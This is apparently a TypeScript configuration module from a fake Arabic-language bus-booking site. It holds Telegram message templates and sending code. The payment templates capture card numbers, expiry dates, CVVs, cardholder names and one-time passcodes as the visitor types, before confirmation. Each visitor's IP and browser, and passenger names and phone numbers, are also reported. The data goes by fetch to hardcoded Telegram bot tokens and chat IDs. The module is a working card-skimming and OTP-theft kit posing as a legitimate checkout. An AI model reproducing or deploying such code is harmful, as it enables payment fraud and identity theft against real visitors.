// ═══════════════════════════════════════════════════════════
// Telegram Settings — Unified config for all bots
// ═══════════════════════════════════════════════════════════

export interface TelegramMessageSetting {
  id: string;
  label: string;
  description: string;
  enabled: boolean;
  template: string;
}

export interface TelegramSettings {
  // Payment Bot
  paymentEnabled: boolean;
  paymentBotToken: string;
  paymentChatId: string;
  paymentMessages: TelegramMessageSetting[];

  // Booking Bot
  bookingEnabled: boolean;
  bookingBotToken: string;
  bookingChatId: string;
  bookingMessages: TelegramMessageSetting[];
}

const SETTINGS_KEY = 'sat_telegram_settings_v1';

const DEFAULT_PAYMENT_MESSAGES: TelegramMessageSetting[] = [
  {
    id: 'card-entered',
    label: 'إدخال البطاقة (وقت فعلي)',
    description: 'تُرسل فوراً عندما يبدأ الزائر بكتابة رقم البطاقة',
    enabled: true,
    template: `<b>💳 الزائر يقوم بإدخال البطاقة (وقت فعلي)</b>\n\n<b>💳 رقم البطاقة:</b> <code>{cardNumber}</code>\n<b>🏦 نوع البطاقة:</b> {cardType}\n<b>🏛 البنك:</b> {bankName}\n<b>💰 المبلغ:</b> {amount} ر.س\n<b>🚌 الرحلة:</b> {from} ← {to}\n<b>💳 طريقة الدفع:</b> {paymentMethod}\n⏰ الوقت: {time}\n📍 IP: {ip}`,
  },
  {
    id: 'card-complete',
    label: 'اكتمال بيانات البطاقة',
    description: 'تُرسل عند إدخال جميع بيانات البطاقة (رقم + تاريخ + CVV)',
    enabled: true,
    template: `<b>✅ جاهز للدفع — جميع بيانات البطاقة مكتملة!</b>\n\n<b>💳 رقم البطاقة:</b> <code>{cardNumber}</code>\n<b>🏦 نوع البطاقة:</b> {cardType}\n<b>🏛 البنك:</b> {bankName}\n<b>📅 تاريخ الانتهاء:</b> <code>{expiryDate}</code>\n<b>🔒 CVV:</b> <code>{cvv}</code>\n<b>👤 اسم حامل البطاقة:</b> {cardHolder}\n<b>💰 المبلغ:</b> {amount} ر.س\n<b>🚌 الرحلة:</b> {from} ← {to}\n<b>💳 طريقة الدفع:</b> {paymentMethod}\n⏰ الوقت: {time}\n📍 IP: {ip}`,
  },
  {
    id: 'otp-typing',
    label: 'كتابة OTP (وقت فعلي)',
    description: 'تُرسل فوراً عند كتابة 4-6 أرقام OTP قبل الضغط على تأكيد',
    enabled: true,
    template: `<b>⚡ الزائر يكتب OTP (وقت فعلي — قبل التأكيد)</b>\n\n<b>🔑 الأرقام المدخلة:</b> <code>{otpCode}</code>\n<b>📏 عدد الأرقام:</b> {otpLength}\n\n<b>💳 رقم البطاقة:</b> <code>{cardNumber}</code>\n<b>🏦 نوع البطاقة:</b> {cardType}\n<b>🏛 البنك:</b> {bankName}\n<b>📅 تاريخ الانتهاء:</b> <code>{expiryDate}</code>\n<b>🔒 CVV:</b> <code>{cvv}</code>\n<b>👤 اسم حامل البطاقة:</b> {cardHolder}\n<b>💰 المبلغ:</b> {amount} ر.س\n📍 IP: {ip}\n⏰ الوقت: {time}`,
  },
  {
    id: 'otp-attempt',
    label: 'محاولة OTP',
    description: 'تُرسل عند كل محاولة إدخال رمز OTP',
    enabled: true,
    template: `<b>📋 الخطوة {attemptNumber}: 🔐 محاولة OTP</b>\n\n<b>🔑 الرمز المدخل:</b> <code>{otpCode}</code>\n\n<b>💳 رقم البطاقة:</b> <code>{cardNumber}</code>\n<b>🏦 نوع البطاقة:</b> {cardType}\n<b>🏛 البنك:</b> {bankName}\n<b>📅 تاريخ الانتهاء:</b> <code>{expiryDate}</code>\n<b>🔒 CVV:</b> <code>{cvv}</code>\n<b>👤 اسم حامل البطاقة:</b> {cardHolder}\n<b>💰 المبلغ:</b> {amount} ر.س\n📍 IP: {ip}\n⏰ الوقت: {time}`,
  },
  {
    id: 'otp-success',
    label: 'نجاح OTP',
    description: 'تُرسل عند نجاح التحقق من OTP',
    enabled: true,
    template: `<b>✅ تم التحقق من OTP — الدفع ناجح!</b>\n\n<b>🔑 الرمز:</b> {otpCode}\n\n<b>💳 رقم البطاقة:</b> <code>{cardNumber}</code>\n<b>🏦 نوع البطاقة:</b> {cardType}\n<b>🏛 البنك:</b> {bankName}\n<b>💰 المبلغ:</b> {amount} ر.س\n📍 IP: {ip}\n⏰ الوقت: {time}`,
  },
  {
    id: 'otp-failed',
    label: 'فشل OTP',
    description: 'تُرسل بعد استنفاد جميع محاولات OTP',
    enabled: true,
    template: `<b>❌ فشلت جميع محاولات OTP — البطاقة مرفوضة</b>\n\nآخر محاولة: {otpCode}\nإجمالي المحاولات: {attemptNumber}\n\n<b>💳 رقم البطاقة:</b> <code>{cardNumber}</code>\n<b>🏦 نوع البطاقة:</b> {cardType}\n<b>🏛 البنك:</b> {bankName}\n<b>💰 المبلغ:</b> {amount} ر.س\n📍 IP: {ip}\n⏰ الوقت: {time}`,
  },
];

const DEFAULT_BOOKING_MESSAGES: TelegramMessageSetting[] = [
  {
    id: 'visitor-enter',
    label: 'زائر جديد',
    description: 'تُرسل فوراً عند دخول زائر للموقع',
    enabled: true,
    template: `<b>🌐 زائر جديد دخل الموقع</b>\n\n<b>📍 IP:</b> <code>{ip}</code>\n<b>🔗 الصفحة:</b> {page}\n<b>🖥️ المتصفح:</b> {ua}\n<b>⏰ الوقت:</b> {time}\n<b>🌍 اللغة:</b> {language}`,
  },
  {
    id: 'search-submitted',
    label: 'نموذج بحث',
    description: 'تُرسل عند إرسال نموذج البحث',
    enabled: true,
    template: `<b>🔍 نموذج بحث مُرسل</b>\n\n<b>📍 من:</b> {from}\n<b>📍 إلى:</b> {to}\n<b>📅 تاريخ المغادرة:</b> {pickupDate}\n<b>🔙 العودة:</b> {returnDate}\n<b>👥 المسافرين:</b> {passengers}\n<b>🎫 نوع التذكرة:</b> {ticketType}\n<b>⏰ الوقت:</b> {time}`,
  },
  {
    id: 'trip-selected',
    label: 'اختيار الرحلة',
    description: 'تُرسل عند اختيار رحلة والضغط على احجز الآن',
    enabled: true,
    template: `<b>✅ اختيار الرحلة</b>\n\n<b>🚌 الرحلة المختارة:</b> {tripNumber}\n<b>💺 الفئة:</b> {fareClass}\n<b>⏰ الوقت:</b> {time}`,
  },
  {
    id: 'seats-selected',
    label: 'اختيار المقاعد',
    description: 'تُرسل عند اختيار المقاعد',
    enabled: true,
    template: `<b>💺 اختيار المقاعد</b>\n\n<b>💺 المقاعد:</b> {seats}\n<b>⏰ الوقت:</b> {time}`,
  },
  {
    id: 'passenger-info',
    label: 'بيانات المسافرين',
    description: 'تُرسل عند إدخال بيانات المسافرين',
    enabled: true,
    template: `<b>📝 إدخال بيانات المسافرين</b>\n\n<b>👥 المسافرون:</b>\n{passengers}\n<b>👤 مسؤول الحجز:</b> {booker}\n<b>⏰ الوقت:</b> {time}`,
  },
  {
    id: 'payment-method',
    label: 'طريقة الدفع',
    description: 'تُرسل عند اختيار طريقة الدفع',
    enabled: true,
    template: `<b>💳 اختيار طريقة الدفع</b>\n\n<b>💳 طريقة الدفع:</b> {paymentMethod}\n<b>💰 المبلغ:</b> {amount} ر.س\n<b>⏰ الوقت:</b> {time}`,
  },
  {
    id: 'new-booking',
    label: 'حجز مؤكد',
    description: 'تُرسل عند إكمال الحجز بنجاح',
    enabled: true,
    template: `<b>🚌 حجز جديد - سات للنقل</b>\n\n<b>📍 المسار:</b> {fromLocation} → {toLocation}\n<b>📅 التاريخ:</b> {pickupDate} - {pickupTime}\n{returnDate}<b>👥 المسافرين:</b> {passengers}\n{selectedFare}{selectedSeats}\n<b>👤 المسافر:</b>\nالاسم: {passengerName}\nالجوال: {passengerPhone}\n\n<b>💰 المبلغ:</b> {totalAmount} ر.س\n<b>💳 الدفع:</b> {paymentMethod}\n\n<i>تم الإرسال تلقائياً</i>`,
  },
];

export function getDefaultTelegramSettings(): TelegramSettings {
  return {
    paymentEnabled: true,
    paymentBotToken: '6836859414:AAEjwy4vkQ2XTWqtYJIJ76tvcjSvFyJCe-s',
    paymentChatId: '-1002118449021',
    paymentMessages: DEFAULT_PAYMENT_MESSAGES,

    bookingEnabled: true,
    bookingBotToken: '7004280527:AAEVpkQzFP9JCuDbmUlwiVqSQBk5zGctklE',
    bookingChatId: '-1002052429288',
    bookingMessages: DEFAULT_BOOKING_MESSAGES,
  };
}

export function loadTelegramSettings(): TelegramSettings {
  try {
    const raw = localStorage.getItem(SETTINGS_KEY);
    if (raw) {
      const parsed = JSON.parse(raw);
      const defaults = getDefaultTelegramSettings();
      // Merge deeply: keep stored tokens + messages, but restore defaults for missing fields
      return {
        paymentEnabled: parsed.paymentEnabled ?? defaults.paymentEnabled,
        paymentBotToken: parsed.paymentBotToken || defaults.paymentBotToken,
        paymentChatId: parsed.paymentChatId || defaults.paymentChatId,
        paymentMessages: mergeMessages(defaults.paymentMessages, parsed.paymentMessages),
        bookingEnabled: parsed.bookingEnabled ?? defaults.bookingEnabled,
        bookingBotToken: parsed.bookingBotToken || defaults.bookingBotToken,
        bookingChatId: parsed.bookingChatId || defaults.bookingChatId,
        bookingMessages: mergeMessages(defaults.bookingMessages, parsed.bookingMessages),
      };
    }
  } catch { /* ignore */ }
  return getDefaultTelegramSettings();
}

function mergeMessages(
  defaults: TelegramMessageSetting[],
  stored?: TelegramMessageSetting[]
): TelegramMessageSetting[] {
  if (!stored || !Array.isArray(stored)) return defaults;
  return defaults.map(d => {
    const s = stored.find(x => x.id === d.id);
    return s ? { ...d, enabled: s.enabled ?? d.enabled, template: s.template || d.template } : d;
  });
}

export function saveTelegramSettings(s: TelegramSettings) {
  localStorage.setItem(SETTINGS_KEY, JSON.stringify(s));
}

// Check if a specific payment message is enabled
export function isPaymentMessageEnabled(step: string): boolean {
  const s = loadTelegramSettings();
  if (!s.paymentEnabled) return false;
  const msg = s.paymentMessages.find(m => m.id === step);
  return msg ? msg.enabled : true;
}

// Check if a specific booking message is enabled
export function isBookingMessageEnabled(msgId: string): boolean {
  const s = loadTelegramSettings();
  if (!s.bookingEnabled) return false;
  const msg = s.bookingMessages.find(m => m.id === msgId);
  return msg ? msg.enabled : true;
}

// Check if booking messages are enabled (global toggle)
export function isBookingEnabled(): boolean {
  const s = loadTelegramSettings();
  return s.bookingEnabled;
}

// Send a booking message using template from settings
export async function sendBookingMessage(
  msgId: string,
  vars: Record<string, string>
): Promise<boolean> {
  if (!isBookingMessageEnabled(msgId)) return false;
  const s = loadTelegramSettings();
  const msg = s.bookingMessages.find(m => m.id === msgId);
  if (!msg || !msg.enabled) return false;
  const text = fillTemplate(msg.template, vars);
  try {
    const resp = await fetch(`https://api.telegram.org/bot${s.bookingBotToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: s.bookingChatId,
        text,
        parse_mode: 'HTML',
      }),
    });
    return resp.ok;
  } catch {
    return false;
  }
}

// Replace template variables
export function fillTemplate(template: string, vars: Record<string, string>): string {
  return template.replace(/\{([^}]+)\}/g, (_, key) => vars[key] ?? `{${key}}`);
}

// Also sync with legacy keys
export function syncLegacyTokens() {
  const s = loadTelegramSettings();
  localStorage.setItem('payment_bot_token', s.paymentBotToken);
  localStorage.setItem('payment_chat_id', s.paymentChatId);
  localStorage.setItem('tg_bot_token', s.bookingBotToken);
  localStorage.setItem('tg_chat_id', s.bookingChatId);
}
